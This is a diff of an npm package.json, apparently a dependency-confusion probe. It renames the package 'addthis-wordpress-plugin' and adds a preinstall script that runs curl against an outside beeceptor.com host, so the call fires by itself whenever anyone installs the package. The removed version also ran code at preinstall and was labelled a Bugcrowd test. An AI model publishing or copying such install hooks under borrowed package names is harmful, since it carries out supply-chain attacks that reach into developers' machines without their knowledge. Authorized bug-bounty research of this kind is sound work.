@@ -1,12 +1,12 @@
 {
-"name": "wwc-apac-2024",
-"version": "2.0.1",
-"description": "Bugcrowd Test",
-"main": "index.js",
-"scripts": {
-    "test": "echo\"Error:no test specified\" && exit 1",
-     "preinstall": "node index.js"
-   },
- "author": "sunny",
- "license": "ISC"
- }
+  "name": "addthis-wordpress-plugin",
+  "version": "2.0.0",
+  "description": "foysal1197",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "curl https://bes23.free.beeceptor.com"
+  },
+  "author": "",
+  "license": "ISC"
+}
